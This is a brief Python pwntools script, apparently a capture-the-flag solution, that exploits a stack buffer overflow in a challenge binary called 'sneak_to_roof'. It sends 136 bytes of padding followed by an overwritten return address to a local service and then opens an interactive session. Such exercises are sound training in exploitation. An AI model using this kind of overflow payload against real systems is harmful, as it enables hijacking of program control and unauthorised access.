from pwn import *

#r = process('./sneak_to_roof')
r = remote('localhost',6703)

payload = b'A'*0x80 + b'A'*8 + p64(0x000000000040066d);
r.sendline(payload)
r.interactive()
print('A'*136)

